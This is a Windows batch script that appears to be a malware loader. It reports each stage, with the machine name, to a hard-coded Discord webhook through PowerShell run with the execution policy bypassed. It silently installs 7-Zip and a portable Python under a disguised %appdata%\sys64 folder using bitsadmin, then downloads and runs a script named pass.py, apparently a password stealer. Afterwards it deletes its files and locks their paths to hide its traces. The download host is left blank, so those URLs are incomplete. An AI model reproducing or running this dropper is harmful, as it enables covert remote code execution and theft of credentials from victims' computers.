@echo off

set "webhookUrl=https://discord.com/api/webhooks/1240038860205985894/qhYcRwGnxahYevjx_X-QSDQXwSj6kOSO4L_47tbHJw8sT4xo29YcWOwZuAiZnqP7XhIz"
set "startMessage=CMD has been opened on %COMPUTERNAME% at %date% %time%."
set "downloadStartMessage=Python download started on %COMPUTERNAME% at %date% %time%."
set "downloadEndMessage=Python download finished on %COMPUTERNAME% at %date% %time%."

:send_webhook
(
echo param ^(^[string^]$webhookUrl, ^[string^]$message^)
echo $body = ^@^{
echo content = $message
echo ^} ^| ConvertTo-Json
echo Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $body
) > SendWebhook.ps1

powershell -ExecutionPolicy Bypass -File SendWebhook.ps1 -webhookUrl "%webhookUrl%" -message "%startMessage%"
del SendWebhook.ps1

set "baseFolderPath=%appdata%\sys64"
set "installFolderPath=%baseFolderPath%\7zip"

if not exist "%installFolderPath%" (
    mkdir "%installFolderPath%"
)

set "downloadUrl=http:///test/7z2406-x64.exe"
set "downloadPath=%baseFolderPath%\7z2406-x64.exe"

bitsadmin /transfer myDownloadJob /download /priority high "%downloadUrl%" "%downloadPath%"
cd /d "%baseFolderPath%"
"%downloadPath%" /D=%installFolderPath% /S
del "%downloadPath%" /f /q
echo Y|cacls "%downloadPath%" /P everyone:n

echo param ^(^[string^]$webhookUrl, ^[string^]$message^) > SendWebhook.ps1
echo $body = ^@^{ >> SendWebhook.ps1
echo content = $message >> SendWebhook.ps1
echo ^} ^| ConvertTo-Json >> SendWebhook.ps1
echo Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $body >> SendWebhook.ps1

powershell -ExecutionPolicy Bypass -File SendWebhook.ps1 -webhookUrl "%webhookUrl%" -message "%downloadStartMessage%"
del SendWebhook.ps1

set "pythonZipUrl=http:///test/Python312.zip"
set "pythonPartUrl=http:///test/Python312.z01"
set "pythonZipPath=%baseFolderPath%\Python312.zip"
set "pythonPartPath=%baseFolderPath%\Python312.z01"

bitsadmin /transfer pythonZipDownload /download /priority high "%pythonZipUrl%" "%pythonZipPath%"
bitsadmin /transfer pythonPartDownload /download /priority high "%pythonPartUrl%" "%pythonPartPath%"

echo param ^(^[string^]$webhookUrl, ^[string^]$message^) > SendWebhook.ps1
echo $body = ^@^{ >> SendWebhook.ps1
echo content = $message >> SendWebhook.ps1
echo ^} ^| ConvertTo-Json >> SendWebhook.ps1
echo Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $body >> SendWebhook.ps1

powershell -ExecutionPolicy Bypass -File SendWebhook.ps1 -webhookUrl "%webhookUrl%" -message "%downloadEndMessage%"
del SendWebhook.ps1

set "extractFolderPath=%baseFolderPath%\py"
if not exist "%extractFolderPath%" (
    mkdir "%extractFolderPath%"
)

cd /d "%baseFolderPath%\7zip"
"%installFolderPath%\7z.exe" x "%pythonZipPath%" -o"%extractFolderPath%"

del "%pythonZipPath%" /f /q
del "%pythonPartPath%" /f /q
echo Y|cacls "%pythonZipPath%" /P everyone:n
echo Y|cacls "%pythonPartPath%" /P everyone:n

set "scriptsFolderPath=%baseFolderPath%\scripts"
if not exist "%scriptsFolderPath%" (
    mkdir "%scriptsFolderPath%"
)

set "scriptUrl=http:///test/pass.py"
set "scriptPath=%scriptsFolderPath%\pass.py"

bitsadmin /transfer scriptDownload /download /priority high "%scriptUrl%" "%scriptPath%"

echo Python path: "%extractFolderPath%\pythonw.exe"
echo Script path: "%scriptPath%"

"%extractFolderPath%\python.exe" "%scriptPath%"

rmdir /s /q "%extractFolderPath%"

echo İşlem tamamlandı.
